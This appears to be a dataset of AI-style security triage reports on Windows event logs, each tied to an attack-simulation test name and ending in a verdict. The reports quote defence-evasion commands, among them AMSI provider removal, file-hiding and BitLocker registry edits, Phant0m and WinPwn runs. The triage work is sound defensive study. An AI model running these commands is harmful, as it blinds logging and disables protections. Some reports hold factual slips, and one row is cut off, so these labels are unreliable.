   - The logs include several entries related to Microsoft Edge Update processes. These process logs appear normal as part of regular Microsoft Edge update operations, as they are running under the `NT AUTHORITY\SYSTEM` account, which is standard for system processes.

4. **System and Security Logs**:
   - There are logs indicating slight changes in system time, but these appear to be related to normal time synchronization processes and not manually triggered or indicative of tampering.

### Assessment:

- **Suspicious Activity Noted**: The PowerShell script attempting to modify file timestamps is an unusual activity that can potentially indicate malicious intent. The nature of timestomping is often associated with attempts to cover up malicious activities.
- **Routine System Processes**: The other repeated system processes executed by `admin_test` (e.g., `wevtutil.exe`, `whoami.exe`) require context to determine intent. Without additional suspicious command-line arguments or context showing malicious use, these remain suspicious but not conclusively malicious.

### Resolution:

- **SUSPICIOUS** - The presence of suspicious PowerShell activity (timestomping script) necessitates further investigation to determine intent and identify potential malicious activity in the environment. While other activities appear benign at face value, the context of their execution in conjunction with other suspicious activities can't be fully assessed without deeper investigation.

### Guidance:

- **Immediate Actions**:
  - Investigate the ""admin_test"" account for unauthorized access or anomalies in user behavior.
  - Review the PowerShell script execution for its origins, purpose, and reach to ensure no further malicious activities were conducted.
  - Validate the integrity of files associated with the detected PowerShell script.

- **Further Monitoring**:
  - Implement monitoring for new PowerShell execution events and file system changes focusing on unusual timestamp modifications.
  - Correlate this activity with network logs to identify potential external communications which could suggest data exfiltration or command-and-control activities.
  
The identified actions and continued monitoring will help to ensure that any potentially malicious behavior is contained and analyzed for further action."
Odbcconf.exe - Load Response File,"Upon reviewing the log entries provided for the investigation, I have identified several points that warrant further attention and analysis:

1. **User Actions and Privilege Escalation:**
   - EventID 4672 (Special privileges assigned to new logon) shows an account, `admin_test`, being assigned a range of high-level privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. These privileges are sometimes indicative of manual tooling being used for lateral movement or privilege escalation.
   - Coupled with EventID 4624 (Logon event) with LogonType 3 (Network), it indicates that `admin_test` accessed the system remotely, potentially pointing to unauthorized access or malicious use without typical local session interaction.

2. **Process Execution:**
   - There is a sequence of process creation involving typical Windows systems utilities like `powershell.exe`, `cmd.exe`, `wevtutil.exe`, along with processes like `MicrosoftEdgeUpdate.exe`. These could signify normal software update activities, specifically relating to Microsoft Edge updates.
   - However, the creation of `cmd.exe` with a command-line argument involving `odbcconf.exe` and a `.rsp` file from a temp directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.008\bin\odbcconf.exe -f ""data.008.rsp""`) is peculiar. This can signify a malicious payload execution or a configuration change which is often leveraged by attackers.

3. **Log Activity:**
   - Use of `wevtutil.exe` by `admin_test` to export logs (`wevtutil.exe epl Microsoft-Windows-Sysmon/Operational C:\Users\ADMIN_~1\AppData\Local\Temp\TempLog.evtx`) could be an attempt to clear or manipulate event logs. Malicious actors often use such commands to hide their tracks after compromising a system.

4. **System and Software Updates:**
   - Repeated instances of the Microsoft Edge update installer and related temp files and processes do suggest active updating of the Microsoft Edge browser. While these actions in isolation might be benign, their prevalence alongside suspicious administrative activity could merit a closer look to ensure no unauthorized manipulations were performed during the update tasks.

5. **Network Connections:**
   - Usage of NTLM authentication from a workstation (DESKTOP-3HL5B2P), especially with remote access and admin account usage via LogonType 3, suggests potential lateral movement from another machine.

Considering these observations, it is prudent to proceed with further investigation as these activities together can indicate a potential security incident involving malicious activity or an insider threat.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Conduct a detailed log correlation to identify connections or patterns across different log sources and times.
- Verify the origin and purpose of remote network logons, particularly those involving the `admin_test` account, to ascertain if they are legitimate.
- Analyze the command line arguments associated with `cmd.exe` and `wevtutil.exe` for possible signs of tampering or anti-forensic behavior.
- Review the use of high-level privileges assigned to `admin_test` for legitimacy, considering policy, timing, and frequency of such assignments.
- Conduct a deeper forensic analysis on the system and related network endpoints to detect potential backdoors or exfiltration activities."
Activities To Disable Microsoft [FIDO Aka Fast IDentity Online] Authentication Detected By Modified Registry Value,"Based on the provided Windows event logs, here is a detailed analysis of the activity observed:

1. **Microsoft Edge Update Execution:**
   - There are multiple instances of Microsoft Edge Update (MicrosoftEdgeUpdate.exe and MicrosoftEdgeUpdateSetup.exe) being executed with various command-line arguments. These seem to be regular update processes initiated by Microsoft Edge Update Service or scheduled tasks, given that the entries reference files in Microsoft Edge's typical update paths and use commands like ""/update"", ""/regserver"", and ""/svc"".

2. **Registry Modification via cmd.exe:**
   - A command was run to add a registry key: `reg add ""HKLM\SOFTWARE\Policies\Microsoft\FIDO"" /v ""AllowExternalDeviceSignon"" /t REG_DWORD /d 0 /f`. This may alter system policy regarding sign-on options. While this can be a legitimate action, it is unusual for this to occur outside of an administrative or IT context which could trigger a security review based on the responsible user's context.

3. **Process Creation of System Utilities:**
   - There are instances of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` being executed by an ""admin_test"" user. While these may be used by system or administrative scripts, frequent execution is somewhat anomalous and should be investigated if not part of standard practice for this user or system management routines.

4. **Audit and System Context without Related Security Entries:**
   - Sysmon logs show these processes running largely under NT AUTHORITY\SYSTEM and SERVER002\admin_test contexts, suggesting administrative operations or elevated privileges. However, without accompanying security logs or traces of administrative task approvals, this can denote attempts at obfuscation or maintaining persistence by an unauthorized actor.

5. **Service Activity:**
   - The ""edgeupdate"" service stops are recorded and log IDs match Sysmon timestamps, suggesting controlled service restarts which usually occur during standard update cycles.

### Conclusion

- **Initial Assessment:** Most notable is the registry modification and the high-integrity level under which commands are executed. These could be normal activities if justified by context but could also indicate privilege misuse or unauthorized changes if not justified by operational requirements or user authorization levels.
  
- **Resolution:** **SUSPICIOUS**

### Guidance

1. **Validate Actions:**
   - Verify with IT whether the registry changes were planned or sanctioned.
   - Check Microsoft Edge’s update schedule and correlate with the times of the edge update processes.
  
2. **Audit User Activity:**
   - Review recent activities performed by `SERVER002\admin_test` for consistency with expected duties.
  
3. **Review Security Logs:**
   - Access security logs which were not included here to trace logon sessions and permissions changes linked to these activities.

4. **Policy and Alerting:**
   - Implement more stringent monitoring and alerting for registry changes and unusual process executions, especially those involving higher privilege uses.

Carry out these measures to determine the legitimacy of actions observed, possibly averting a potential compromise."
Disable Defender Using NirSoft AdvancedRun,"Upon analyzing the Windows event logs provided, there are several points of concern that suggest potentially malicious activity. Here's a detailed breakdown:

1. **Use of AdvancedRun to Stop Windows Defender**:
   - **Observation**: There's a PowerShell command running AdvancedRun, a NirSoft utility, which attempts to stop the Windows Defender service (`WinDefend`). This is anomalous as stopping Windows Defender is a common tactic seen in malware to disable system defenses.
   - **Details**: The command was executed via PowerShell, with the specific attempt to run `sc.exe` to stop the `WinDefend` service. Additionally, there was a secondary attempt to run a PowerShell command that involves using `rmdir` to potentially delete Windows Defender's program data.
   - **Context**: The execution of scripts to stop or manipulate security services is a strong indicator of compromise.

2. **Frequent and Unusual Process Spawning**:
   - **Observation**: There is a high frequency of `wevtutil.exe` and `conhost.exe` process creations in quick succession. `wevtutil.exe` is generally used for managing Windows event logs, which can be suspicious if used in attempts to delete logs or tamper evidence.
   - **Details**: These processes are executed by the same user `SERVER002\admin_test`. While `conhost.exe` can be a normal system process, excessive spawning outside the usual patterns could indicate process injection or abuse.

3. **Execution Context**:
   - The user `SERVER002\admin_test` across multiple processes has a high integrity level and is involved in the suspicious activity, possibly indicating that their account or session may have been compromised to execute these tasks.

4. **Edge Update Processes**:
   - A variety of processes related to Microsoft Edge Update are seen. While these are benign in nature as part of routine system updates, they stand out less than the actions involving PowerShell and AdvancedRun.

**Resolution**: **MALICIOUS**

**Assessment**: The logs indicate that there is a significant risk, with evidence suggesting that malicious scripts were being executed to disable security features and potentially tamper with system defenses. This pattern is consistent with efforts to compromise the system and should be treated with significant concern.

**Guidance**:
- **Immediate Actions**: 
  - Conduct a thorough review and scan for malware using robust security tools.
  - Assess the integrity of the `SERVER002\admin_test` account and consider performing a credential reset.
  - Investigate all paths and locations mentioned (e.g., `C:\Users\ADMIN_~1\AppData\Local\Temp\`) for presence of unauthorized executables or scripts.
  - Review event log policies and investigate whether `wevtutil.exe` activity corresponds to log clearing attempts.
  
- **Long-term Measures**:
  - Implement tighter monitoring on scripting and execution, especially for PowerShell and command utilities.
  - Ensure endpoint protection configurations do not allow easy disabling or stopping.
- **Follow-Up**: Engage Incident Response team to determine the extent of the potential breach and secure all impacted systems."
Modify UsePIN Registry entry,"After analyzing the provided Windows event logs, here is a detailed assessment of potential malicious activity:

### Analysis

1. **Edge Update Activity**:
   - There are multiple instances of `MicrosoftEdgeUpdate.exe` processes being executed, which is expected behavior for maintaining updated browser components. However, it is notable that different versions of Microsoft Edge Update are executing in rapid succession, which might warrant further inspection to confirm that updates are legitimate and not a cover for unwanted software.
   
2. **Suspicious Command Execution**:
   - A notable event involves the execution of `cmd.exe` with a command to modify the Windows Registry: 
     ```plaintext
     ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePIN /t REG_DWORD /d 2 /f
     ```
     - The command modifies the registry key related to BitLocker Drive Encryption, which could potentially alter security settings. This activity executed under the user `SERVER002\admin_test` with high integrity level is suspicious and should be investigated further. The change to security settings without explicit authorization can indicate administrative activity that isn't necessarily benign.

3. **Multiple System Tools Executions**:
   - The logs show multiple executions of `whoami.exe`, `hostname.exe`, `conhost.exe`, and `wevtutil.exe`. These tools are often used for system administration but can also be indicative of reconnaissance steps taken by malicious entities, especially when executed in close sequence by a user with administrative privileges.

4. **Registry Modification with `reg.exe`**:
   - Similarly, the `reg.exe` process was executed directly following the `cmd.exe` incident to apply the changes, confirming that a registry modification was implemented.

5. **User Context & Privilege Level**:
   - The actions were predominantly executed under `SERVER002\admin_test` user, which raises questions about whether this user account was potentially compromised, given the nature of commands executed.

### Assessment

The presence of benign processes such as `MicrosoftEdgeUpdate.exe` is typical; however, the suspicious command line activities (especially involving registry modifications related to security settings) are significant causes for concern.

### Resolution

**Resolution: SUSPICIOUS**

**Recommendations:**
- **Verify Legitimacy**: Confirm whether the modification to the BitLocker related registry key was planned maintenance or unauthorized.
- **Account Review**: Investigate the activity history of the `admin_test` account to ensure it has not been compromised.
- **Malware Scan**: Conduct a comprehensive malware scan of `Server002` to determine whether malicious software was responsible for unauthorized changes.
- **Audit Logs**: Review additional security logs around the time of suspicious activity for potential unauthorized access or privilege escalation attempts.
- **Change Control Measures**: Implement or review change management protocols to capture and authorize significant registry or system changes.

Further investigation into the logged activities is needed to determine whether they pose legitimate threats, or they are part of normal system maintenance executed under unusual circumstances."
Makes Eventlog blind with Phant0m,"Detailed Analysis of Logs:

### Indicators of Suspicious Behavior:

1. **Execution of Phant0m.exe**:
    - EventID 1 (Process creation) shows a process created for `cmd.exe` with a command line execution pointing to `Phant0m.exe`:  
      ```
      ""CommandLine"":""\""cmd.exe\"" /c \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\bin\\Phant0m.exe\""""
      ```
    - This executable is not a standard Windows utility and is known to have associations with activities like hiding Windows Event Logs, which is suspicious and often used by threat actors to evade detection.

2. **Use of Administrative and System Privileges**:
    - Multiple activities are run by `SERVER002\admin_test` with high integrity levels, which indicates high privilege usage. The persistence of using high privileges could indicate an exploitation of an account, especially if these accounts are not usually active or such privileged executions are not typical.
    - Windows Security Auditing shows EventID 4672, indicating privileged account usage for:
      ```
      SeDebugPrivilege, SeTcbPrivilege, SeLoadDriverPrivilege, SeRestorePrivilege
      ```

3. **Process Execution of Utilities like 'powershell.exe', 'wevtutil.exe', and 'whoami.exe'**:
    - The continual execution of `wevtutil.exe` may be used for Event Log clearing. 
    - The execution of the `whoami.exe` utility might be used to check current user information to verify privilege levels.

### Indicators of Potentially Malicious Activity:

- The existence and execution of Phant0m.exe is a strong indicator of potentially malicious activity. Phant0m.exe is known for targeting event logs and aiding malware activities by disrupting logging services which implies a deliberate attempt to cover tracks or exfiltrate data unnoticed.

### Assessment:

Overall, the repeated invocation of potentially dangerous utilities like `wevtutil.exe`, execution of known suspicious applications like `Phant0m.exe`, and the inconsistency of privilege account sessions contribute to potential malicious behavior in the environment. The combination of these factors—especially the presence of `Phant0m.exe`—generally implies that an attacker may be trying to manipulate or hide activities on the system.

### Resolution:

- **MALICIOUS**: The execution of `Phant0m.exe` is a direct indicator of malicious intent due to its association with well-known evasive tactics used by attackers. The logs of other processes like `wevtutil.exe` support this assessment by hinting at log-clearing actions.

### Guidance on How to Proceed:

1. **Immediate Actions**:
   - Isolate the server Server002 from the network to prevent further spread or communication.
   - Conduct a thorough forensic investigation to assess the depth and breadth of the compromise.
   - Collect any remaining logs and memory dumps for further analysis.

2. **Remediation**:
   - Change all potentially compromised passwords, especially for administrative accounts such as `admin_test`.
   - Review and improve security policies around privilege management and auditing to prevent further abuses.
   
3. **Monitoring and Detection**:
   - Set up better detection mechanisms for suspicious processes such as unknown binaries executing from temporary directories.
   - Implement enhanced logging and SIEM alerting to pick up on similar activities in future.

4. **Post-Incident Review**:
   - Conduct a full security review to understand the entry points and patch vulnerabilities that may have been exploited.
   - Provide training and awareness to prevent privilege misuse or accidental facilitation of such attacks in the future."
Hide Files Through Registry,"Upon reviewing the provided Windows event logs, I conducted a detailed analysis focusing on signs of anomalous or malicious activity. Here is my assessment:

### System Log
The system log entries pertain to time synchronization events which are routine activities associated with `svchost.exe` managing the Windows Time Service. There's no indication of malicious behavior here—time adjustments to synchronize with an NTP server (time.windows.com) are standard in maintaining time accuracy across a network.

### Application Log
The events related to ""edgeupdate"" primarily indicate normal service start and stop activities. This is typical for the update mechanism of Microsoft Edge and does not appear suspicious.

### Sysmon Log
1. **Process Execution:** The execution of `wevtutil.exe` by `SERVER002\admin_test` indicates handling of Windows event logs. While `wevtutil.exe` can be utilized by attackers for log clearing, it is not intrinsically suspicious without additional context.
   
2. **Command-Line Argument Analysis:** The critical log details include the execution of `cmd.exe` with the command to modify registry settings:
   ```
   «cmd.exe» /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f & reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 0 /f
   ```
   This command modifies registry settings to alter file visibility settings, potentially being used to conceal files. This behavior is suspicious but does not provide conclusive evidence as malicious on its own.

3. **Parent-Child Process Relationships:** `whoami.exe` and `hostname.exe` executions do not seem out of place and might be part of an administrative script or task.

4. **Microsoft Edge Update:** Multiple entries for MicrosoftEdgeUpdate.exe and related helper executables show legitimate update activities carried out by the system, indicating healthy software maintenance operations.

### Security Log
The entries reflect the change in system time, correlating with system log entries related to time synchronization. Changes being logged at this level are standard, aligning with operations observed in other log channels.

### Conclusion and Recommendation
- The logs do not immediately exhibit unmistakable signs of a system compromise or malware activity but do feature some unusual application behavior (registry modification via `cmd.exe`) that might warrant closer scrutiny and reason for further investigation.
- **Resolution: SUSPICIOUS**

**Recommendation for Further Action:**
1. **Investigate the Context of Registry Modification:** Determine if `cmd.exe` registry changes were part of an authorized script or process. Check configurations or policies that might explicitly implement such changes.
2. **User Validation:** Review `SERVER002\admin_test` user activity logs to verify legitimacy and authorization of executed commands. Cross-reference them with expected administrative tasks.
3. **Monitor for Future Anomalies:** Configure alerts for similar patterns of behavior, notably registry changes and abnormal execution of administrative tools like `wevtutil.exe`.
4. **Network Surveillance:** Ensure continuous monitoring using IDS/IPS for unauthorized communication or potentially linked malicious activity.

In summary, while no definitive malicious activity is identified, cautious vigilance and contextual validation are advised due to the observed modifications of system settings."
Disable Windows Auto Reboot for current logon user,"After thoroughly reviewing the provided logs, I have compiled an analysis based on observed activities and patterns across the various event logs (System, Windows PowerShell, Sysmon, Security, and Application):

### Analysis

1. **Time Synchronization (System and Security Logs)**:
   - The `Microsoft-Windows-Kernel-General` events indicate a change in system time, executed by `svchost.exe`, which is a standard Windows process. The synchronization seems typical, as it also aligns with `Microsoft-Windows-Time-Service` logs reflecting an NTP server (`time.windows.com`).
   - The corresponding security audits (Event ID: 4616) confirm the change was likely routine and executed by a service account.

2. **Sysmon Logs**:
   - **Process Activity**: There are several Sysmon Event ID 5 entries related to process creation involving typical Windows system processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe`. These processes, while legitimate, span across a short duration and involve administrative commands, such as:
     - `wevtutil.exe` is tied to a user `SERVER002\\admin_test`, but without accompanying sensitive actions or unusual paths, its role is uncertain.
     - Execution of `whoami.exe` and `hostname.exe` seems benign and common for user or script executions checking context or environment.
   - **Registry Modification**: There is a notable Sysmon Event ID 1 entry involving `cmd.exe` executing a registry modification using `reg.exe`. The command executed prevents automatic system reboots when users are logged on (`NoAutoRebootWithLoggedOnUsers`). This isn't malicious per se but implies administrative intent or automated configurations/scripts modifying system behavior.

3. **Application and Edge Update Activity**:
   - **Edge Update**: The logs illustrate normal activities related to Microsoft Edge updates, with executable launches aligned with typical update processes. The activities include service stops and an update sequence without apparent anomalies or unauthorized actions.
   - **Software Protection Platform**: A log detailing the invocation of `Software Protection Platform Service` (Event ID 16384) appears routine and aligns with expected system processes.

### Assessment

- **Time synchronization** and process executions such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe` align with regular administrative actions and scheduled system maintenance operations. These show no overt signs of compromise or unusual privilege escalation.
- **Registry Modification** using `reg.exe` could warrant further scrutiny in context (e.g., was this change authorized? Is it part of a regularly scheduled task or policy update?).
- **Edge Update Activities** and `Software Protection Platform` logs signify routine operations without any immediate threat indicators.

### Conclusion

Based on the logs reviewed, there are no strong indicators of malicious activity. However, the registry modification might necessitate context validation to ensure it wasn't conducted through unauthorized means. Given the information and current patterns observed:

**Resolution**: **BENIGN**

The logs reflect routine operating system and application activities without confirmed malicious actions. However, you may consider verifying the context of the registry change within organizational policy frameworks to rule out any misconfigurations or unintended administrative actions."
Windows HideSCANetwork Group Policy Feature,"Upon analyzing the provided Sysmon, Application, and other event logs, several observations and potential indicators of concern arise:

1. **Process Execution Patterns**:
   - Frequent execution of system utilities such as `whoami.exe`, `wevtutil.exe`, and `cmd.exe` in conjunction with elevated privilege commands are indicators that attract attention.
   - Of note, `cmd.exe` was used with a command line execution of a registry modification: `reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCANetwork /t REG_DWORD /d 1 /f`. This action could be modifying user interface elements or behavior, which might be leveraged by malware or unauthorized users to hide activity.

2. **Privilege and Integrity**:
   - Many operations are executed by the user `SERVER002\admin_test` and under the `NT AUTHORITY\SYSTEM`. Actions taken with SYSTEM-level integrity are inherently higher risk due to the elevated privileges those actions have on the system.
   - Host components such as `wsmprovhost.exe` are used, which may indicate remote management activities. However, this is not inherently suspicious but worth noting for access patterns.

3. **Repeated Edge Update Executions**:
   - The Microsoft Edge Update process (`MicrosoftEdgeUpdate.exe`) appears multiple times. While it is normal for updates to occur, especially if scheduled, the frequent invocation of different Edge Update components (`MicrosoftEdgeUpdateComRegisterShell64.exe`) and setup executions warrants a closer look to ensure these are legitimate and not a masquerade.

4. **Command-Line Arguments**:
   - The presence of specific commands, such as the registry edit mentioned, suggests an administrative action or system modification. Without prior context of scheduled tasks or expected changes, this should be considered suspicious.

5. **General Activity Context**:
   - The timing and sequence of events show a condensed series of actions in a short timeframe, which can be an indicator of scripted or automated behavior, often indicative of either administrative upkeep or malicious activity.

**Assessment & Resolution**:
Based on the evidence provided, there are elements in the log that require additional investigation to ensure they are consistent with authorized administrative activities. Specifically, the registry modification and the high frequency of privileged actions potentially aligning with anomaly indicators. While these issues do not incontrovertibly confirm malicious activity without further context or corroborating events from other sources, they pose enough questions to be classified as requiring further analysis.

**Final Resolution**:
- **SUSPICIOUS**: The log activity contains behavior that deviates from standard patterns and includes actions such as registry modification with elevated privileges, which necessitate further investigation to determine the legitimacy and intent of these actions. Immediate steps should include verifying the origin of commands, intent, and the administrative activities scheduled for the period in question. Additionally, scrutinize user account activity and logins for potential unauthorized access."
Execution from Compressed File,"Based on the analysis of the provided Windows event logs, I have identified several activities that require further scrutiny, particularly concerning the execution of certain processes by the user ""SERVER002\\admin_test"". Here are the key observations:

1. **Frequent Usage of PowerShell:**
   - The logs indicate the execution of `powershell.exe` by the ""SERVER002\\admin_test"" user. While PowerShell is a legitimate tool for scripting and task automation, it is also commonly used by attackers for malicious purposes. However, the provided log does not specify any suspicious command-line arguments, scripts, or activities executed with PowerShell during this investigation.

2. **Unusual Process Execution:**
   - The `cmd.exe` process executed a specific command: 
     ```
     ""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\temp_data.zip\\data.exe""
     ```
   - This indicates an attempt to execute an executable named `data.exe` located in a directory path that involves devious navigation. This is highly suspicious and often indicative of an attempt to hide the execution of possibly malicious code.

3. **Execution of Unknown Executable:**
   - The process `data.exe` is executed from a temporary directory, which is unusual for legitimate applications and more characteristic of malware activity. The absence of metadata (like version, description, product) for this executable heightens concerns.

4. **Chaining of Process Executions:**
   - The `data.exe` spawns `calc.exe`, indicating it could be a benign process trying to cover its tracks. Launching a default application like Calculator may attempt to divert attention from the process script.

5. **Credentials Access:**
   - Several failed attempts to access credentials are recorded, with ReturnCode: 3221226021. Although this indicates a potential security concern, it's more likely related to network or authentication settings.

6. **Windows Update Activity:**
   - There is normal activity concerning Windows Update with the installation of security intelligence updates for Microsoft Defender. These activities are regular maintenance tasks and expected on a secure system.

### Conclusion:

Based on the identified suspicious activity, particularly regarding the execution of `data.exe` and the use of a command shell in a potentially stealthy manner, these logs should be classified as **SUSPICIOUS**. 

### Recommendations:
- **Further Investigation:** Conduct a deeper forensic analysis of the `data.exe` file to ascertain its origin and intent. Utilize sandboxing and reverse engineering techniques as necessary.
- **Monitor PowerShell Activities:** Implement real-time monitoring and alerting for PowerShell executions to quickly detect and respond to any anomalies or malicious patterns.
- **Log Review:** Examine additional endpoint protection, firewall, and intrusion detection logs for correlated activity that could aid in understanding the broader context of this event.
- **User Verification:** Verify user ""admin_test"" and their activities, ensuring that credentials have not been compromised.

This investigation requires expedited attention to prevent potential threats to system security."
Invoke HTML Application - JScript Engine with Inline Protocol Handler,"After a detailed analysis of the provided Windows event logs, the following observations and assessments have been made:

### Observations:

1. **PowerShell Activity**:
   - There are multiple Sysmon event entries showing the execution of `powershell.exe` (e.g., EventRecordID 18017 and 18052). PowerShell is used with command: `Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\\system32\\mshta.exe`.

2. **Unusual PowerShell Command**:
   - The use of `Invoke-ATHHTMLApplication` in PowerShell is uncommon. It suggests the execution of a script possibly designed to run embedded scripts via `mshta.exe`. This can be a technique used for executing malicious scripts while bypassing restrictions.

3. **Wevtutil and Conhost Activity**:
   - Multiple entries for `wevtutil.exe` and `conhost.exe` being executed in quick succession (e.g., EventRecordID 18022, 18026, 18031). `wevtutil.exe` is a legitimate Windows utility used for managing event logs but can be misused to clear logs, often a step in covering tracks.

4. **Executing Known Windows Binaries (e.g., whoami.exe, hostname.exe)**:
   - The execution of normal Windows utilities like `whoami.exe` and `hostname.exe` could indicate an attempt to gather system information.

5. **Edge Setup Executions Under SYSTEM User**:
   - Several instances of `setup.exe` related to Microsoft Edge running with `NT AUTHORITY\SYSTEM` privileges (EventRecordID 18019, 18030, 18043).

### Assessment:

The presence of suspicious PowerShell activity, particularly the command involving `Invoke-ATHHTMLApplication` with `mshta.exe`, is indicative of potentially malicious activity. This command could be an attempt to leverage PowerShell and MSHTA for scripts execution in an unauthorized or stealthy manner, which is a known method in certain exploit kits and malware.

The repeated invocation of `wevtutil.exe` raises concerns about potential log manipulation, which is a common technique in post-exploitation scenarios to obscure audit trails.

The multiple legitimate Windows binaries execution as SYSTEM and frequent setup activity related to Edge are worthy of attention but could also be part of legitimate operations such as updates. However, the context in combination with the other findings leans towards potentially malicious intentions.

### Recommendation:

- **Resolution:** **SUSPICIOUS**
  
- **Guidance**:
  - Conduct a deeper investigation into the system's network activity and any corresponding alerts around the time of these events.
  - Review user logs and permission changes, focusing on the user `SERVER002\admin_test`.
  - Conduct a comprehensive malware scan on Server002.
  - Monitor for any persistence mechanisms or unrecognized startup activities.
  - If possible, retrieve and analyze any associated scripts or resources related to PowerShell executions to ascertain their intent and ensure they are not malicious. 
  - Consider engaging an incident response team if further suspicious activities are confirmed upon continued investigation."
WinPwn - Kill the event log services for stealth,"After a thorough examination of the provided Windows event logs, the following points of analysis are discerned:

### Analyzed Log Entries:
1. **Application Log:**
   - Primarily contains entries related to service activities, notably ""service stopped"" activities for `edgeupdate`.
   - No direct signs of malicious behavior in these application-level logs.

2. **Sysmon Log:**
   - **Multiple Instances of wevtutil.exe and conhost.exe Execution:**
     - These are generally administrative or system-related processes. Their frequent invocation could suggest legitimate administrative activity but warrants closer scrutiny for unexpected behavior.
   - **Execution of PowerShell with Suspicious Command:**
     - Logs indicate execution of `powershell.exe` with a command string that effectively downloads and executes a PowerShell script from a remote source (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/…`).
     - This is a classic signature of a script being fetched and executed from the internet, which is a common method of delivering payloads for various forms of cyber exploitation.
   - **HOSTNAME.EXE and WHOAMI.EXE Executions:**
     - These utilities are generally benign and serve to gather system information. However, their execution around the time of suspicious PowerShell activity reinforces concerns about scripted data gathering or reconnaissance activities.
   
3. **Windows PowerShell Log:**
   - Confirms the suspicious execution of PowerShell with embedded web client commands to execute remote scripts.
   - Repeated entries suggest a deliberate fetch and execution of potentially malicious content.

### Assessment:
- **Indicators of Malicious Activity Detected:**
  - The specific PowerShell execution stands out as a significant threat vector. The nature of downloading and execution of scripts from a known URL repository for penetration testing tools is highly indicative of malicious intent.
  - The behavior aligns with attempts to leverage or explore vulnerabilities within the system.

AMSI Bypass - Remove AMSI Provider Reg Key,"After reviewing the provided Windows event logs, there are several points of interest that suggest potential malicious activity:

### Key Suspicious Observations:

1. **PowerShell Activity:**
   - There are multiple PowerShell events showing the execution of a command to remove an Anti-Malware Scan Interface (AMSI) provider via the registry: 
     ```
     powershell.exe & {Remove-Item -Path ""HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}"" -Recurse}
     ```
   - This action is highly suspicious. AMSI is designed to help detect malware and removing its provider entries may indicate an attempt to evade detection mechanisms.

2. **High Integrity Level Execution:**
   - The PowerShell command was executed with high integrity level, indicating administrative privileges were used.
   - The user involved, `SERVER002\admin_test`, consistently appears in the logs with high integrity level activities, implying potential misuse of administrative privileges.

3. **Suspicious Process Creation:**
   - The sequence of events in the Sysmon logs shows various processes executed by `SERVER002\admin_test`, including `conhost.exe` and `whoami.exe`, that follow immediately after the PowerShell command. While `whoami.exe` is used to display user information, its execution chain and context here (immediately following a suspicious PowerShell command) suggest post-exploitation activities.

4. **EdgeUpdate Activity:**
   - While the Microsoft Edge Update process is standard for system updates, the large number of instances and execution paths noted in the logs, especially under `Temp` directories, may warrant further investigation to ensure they are not being leveraged for unauthorized updates or code execution.

### Conclusion:

- **Resolution: SUSPICIOUS**
  
  The removal of the AMSI provider registry key via PowerShell is a strong indicator of a potential malware or adversary evasion technique. The context and subsequent activities in the logs suggest this behavior is not benign. Further investigation is necessary to confirm whether these logs represent malicious actions or a benign administrative action possibly conducted by in-house IT personnel.

### Guidance:

1. **Immediate Action:**
   - **Isolate the Host:** To prevent any potential spread of malicious activity, isolate Server002 from the network.
   - **Notify Security Teams:** Alert your incident response team to prioritize this investigation.

2. **Further Investigation:**
   - **Analyze User Actions:** Review recent activities and access patterns for `admin_test` to determine if these actions were unauthorized.
   - **Examine Integrity of AMSI:** Conduct a thorough review of AMSI configurations and capabilities on the host to ensure no other critical security features have been tampered with.
   - **File Integrity Checks:** Examine the involved process binaries and verify their checksums against known good baselines.

3. **Mitigation:**
   - Re-enable and configure AMSI registry keys correctly if found altered or removed.
   - Reinforce PowerShell Constrained Language Mode, or implement strict execution policies to prevent unauthorized script execution."
Adding custom paths for application execution,"In reviewing the provided logs, the Sysmon log shows a series of execution events involving typical Windows system executables like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` executed by the user `SERVER002\admin_test`. These are typically benign processes and do not inherently suggest malicious activity; however, several aspects require further scrutiny:

1. **Suspicious Registry Modification:**
   - An execution of `cmd.exe` with the command line `reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"" /t REG_SZ /d C:\Windows\System32\notepad.exe /f` was recorded (EventID 1, ProcessId 2408).
   - This action effectively alters the registry to redirect executions of `msedge.exe` to launch `notepad.exe`, which is typically indicative of a compromise where an attacker attempts to escalate privileges or maintain persistence.

2. **Elevated Privileges:**
   - Security logs show a user `admin_test` with several high privileges, such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, suggesting potential privilege escalation or inappropriate use of elevated privileges, which is often a red flag within an enterprise environment.

3. **Presence of potentially unauthorized actions:**
   - The frequent execution of `whoami.exe` and `hostname.exe` can sometimes be employed by attackers for reconnaissance purposes, especially in environments where they aren't typically executed as part of normal operations.

4. **NTLM Login:**
   - Logon through NTLM from a workstation `DESKTOP-3HL5B2P` (EventID 4624) with an IP address of `192.168.0.102`. While this is common, it may suggest lateral movement if the connection is unexpected.

Given the combination of registry modification, elevated privileges, and potentially unauthorized activity seen in these logs, the activity should be flagged for further investigation. It may indicate the beginning phases of a malicious intrusion or an abuse of administrative functions.

### Assessment and Resolution

- **Resolution: SUSPICIOUS**: There is no direct evidence of undoubtedly malicious actions; however, the registry modification, use of high privilege processes, and suspicious command executions merit careful examination. Further investigation should involve:
  - Determining if the registry change was authorized and verifying the exact routine of `admin_test` operations.
  - Investigating the source and intent of changes initiated from `DESKTOP-3HL5B2P`.
